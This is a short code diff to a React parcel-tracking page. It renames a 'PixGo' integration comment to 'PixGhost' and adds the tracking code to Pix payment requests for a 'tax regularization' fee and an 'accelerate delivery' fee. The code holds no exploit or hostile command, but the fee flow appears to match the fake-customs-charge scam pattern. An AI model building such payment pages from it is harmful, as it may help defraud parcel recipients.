@@ -15,7 +15,7 @@ const TrackingPage: React.FC = () => {
     const [showExpressModal, setShowExpressModal] = useState(false);
     const [showTaxModal, setShowTaxModal] = useState(false);
 
-    // PixGo Integration State
+    // PixGhost Integration State
     const [pixLoading, setPixLoading] = useState(false);
     const [pixData, setPixData] = useState<any>(null);
     const [pixPaid, setPixPaid] = useState(false);
@@ -583,7 +583,8 @@ const TrackingPage: React.FC = () => {
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({
                                         amount: finalAmount,
-                                        description: `Regularização Fiscal - ${trackingData.codigo}`
+                                        description: `Regularização Fiscal - ${trackingData.codigo}`,
+                                        codigo: trackingData.codigo
                                     })
                                 });
                                 const data = await res.json();
@@ -739,7 +740,7 @@ const TrackingPage: React.FC = () => {
                                     const res = await fetch(`${API_BASE}/api/pix/create`, {
                                         method: 'POST',
                                         headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({ amount: finalAmount, description: 'Acelerar Entrega Rastreamento' })
+                                        body: JSON.stringify({ amount: finalAmount, description: 'Acelerar Entrega Rastreamento', codigo: trackingData?.codigo || '' })
                                     });
                                     const data = await res.json();
                                     if (data && data.success) {
